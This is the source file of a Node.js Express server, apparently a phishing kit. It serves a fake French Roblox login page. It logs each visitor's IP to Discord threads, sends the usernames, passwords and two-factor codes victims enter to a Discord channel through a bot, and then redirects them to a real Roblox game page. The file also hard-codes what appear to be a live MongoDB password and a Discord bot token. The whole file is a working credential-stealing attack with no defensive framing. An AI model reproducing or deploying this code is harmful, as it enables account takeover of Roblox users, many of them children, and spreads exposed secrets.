(async () => {
    const express = require("express")
    const app = express()
    const path = require('path')
    app.listen(4000, () => {
        console.log(`Le serveur est bien lancé sur le port 3000`);
    })
    app.set("view engine", "ejs")
    app.set("views", path.join("src/views"))
    app.use(express.static(path.join("src/assets/css")))
    app.use(express.static(path.join("src/assets/img")))
    app.use(express.static(path.join("src/assets/js")))
    const cors = require('cors')
    const bodyParser = require('body-parser')
    const mongoose = require('mongoose')
    mongoose.set("strictQuery", false)
    mongoose.connect("mongodb+srv://naka:1234@cluster0.bpg5trd.mongodb.net/roblox")
        .then(() => console.log("Connexion a mongoDB effectué"))
        .catch(() => console.log("Erreur lors de la connexion a MongoDB"))
    app.use(bodyParser.json())
    app.use(bodyParser.urlencoded({
        extended: false,
        limit: '500mb',
        parameterLimit: 100000,
    }));
    const rateLimit = require('express-rate-limit');
    const limiter = rateLimit({
        windowMs: 60 * 1000,
        max: 50
    });
    app.use(limiter);
    app.use(cors())
    const expressip = require('express-ip');
    app.set('trust proxy', 1);
    app.use(expressip().getIpInfoMiddleware);
    const { Client, GatewayIntentBits, Collection, EmbedBuilder, ThreadAutoArchiveDuration } = require("discord.js");
    const client = new Client({
        intents: Object.keys(GatewayIntentBits).map((x) => {
            return GatewayIntentBits[x]
        }),
    });
    await client.login("MTIyNTgwNTUzNjYwODM4NzA3Mg.Gt5CeO.CNa5j20ey8HaDbyvY-OcDKFjUJZuS9HFzgJH1M");

    client.on("ready", () => {
        console.log("Bot connecté")
    })

    const Connexion = require('./models/connexion')

    function getCurrentDate() {
        var currentDate = new Date();
        var day = currentDate.getDate();
        var month = currentDate.getMonth() + 1;
        var year = currentDate.getFullYear();
        var hours = currentDate.getHours();
        var minutes = currentDate.getMinutes();

        if (day < 10) {
            day = '0' + day;
        }
        if (month < 10) {
            month = '0' + month;
        }
        if (hours < 10) {
            hours = '0' + hours;
        }
        if (minutes < 10) {
            minutes = '0' + minutes;
        }

        return day + '/' + month + '/' + year + ' ' + hours + ':' + minutes;
    }

    app.get('/fr/login', async (req, res) => {
        console.log(req?.ipInfo);
        const fetchConnexion = await Connexion.getConnexionByIp(req?.ipInfo?.ip)
        res.status(200).render("index", {})
        if (fetchConnexion) {
            return client.guilds.cache.get("1022885234619985992").channels.cache.get(fetchConnexion.channel_id).send({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Nouvelle connexion")
                        .setDescription(`\`\`\`${req?.ipInfo?.ip}\`\`\``)
                ]
            }).catch(() => 0)
        } else {
            return client.guilds.cache.get("1022885234619985992").channels.cache.get("1235950074018795630").threads.create({
                name: req?.ipInfo?.ip,
                topic: "",
                autoArchiveDuration: ThreadAutoArchiveDuration.OneHour,
                message: {
                    content: getCurrentDate(),
                }

            }).then((thread) => {
                thread.send({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle("Connexion")
                            .setDescription(`\`\`\`${req?.ipInfo?.ip}\`\`\``)
                    ]
                }).catch(() => 0)
                Connexion.create(req?.ipInfo?.ip, thread.id)
            }).catch(() => 0)
        }
    });

    app.post("/", async (req, res) => {
        const fetchConnexion = await Connexion.getConnexionByIp(req?.ipInfo?.ip)
        if (!fetchConnexion || (!req.body.username || !req.body.password)) return res.status(404).redirect("/fr/login")
        res.status(200).render("2AF", {})
        return client.guilds.cache.get("1022885234619985992").channels.cache.get(fetchConnexion.channel_id).send({
            embeds: [
                new EmbedBuilder()
                    .setTitle("Compte")
                    .addFields([
                        {
                            name: "Identifiant",
                            value: `\`\`\`${req.body?.username ? req.body?.username : "Erreur"}\`\`\``
                        },
                        {
                            name: "Mot de passe",
                            value: `\`\`\`${req.body?.password ? req.body?.password : "Erreur"}\`\`\``
                        },
                        {
                            name: "Ip",
                            value: `\`\`\`${req?.ipInfo?.ip ? req?.ipInfo?.ip : "Erreur"}\`\`\``
                        }
                    ])

            ]
        }).catch(() => 0)
    })

    app.post("/2AF", async (req, res) => {
        const fetchConnexion = await Connexion.getConnexionByIp(req?.ipInfo?.ip)
        if (!fetchConnexion) return res.status(404).redirect("/fr/login")
        res.status(200).redirect("https://www.roblox.com/fr/games/2753915549/Blox-Fruits")
        return client.guilds.cache.get("1022885234619985992").channels.cache.get(fetchConnexion.channel_id).send({
            embeds: [
                new EmbedBuilder()
                    .setTitle("2AF")
                    .addFields([
                        {
                            name: "Code",
                            value: `\`\`\`${req.body?.code ? req.body?.code : "Erreur"}\`\`\``
                        },
                        {
                            name: "Ip",
                            value: `\`\`\`${req?.ipInfo?.ip ? req?.ipInfo?.ip : "Erreur"}\`\`\``
                        }
                    ])

            ]
        }).catch(() => 0)
    })

    app.use((req, res, next) => {
        res.status(200).redirect("/fr/login")
    })
})()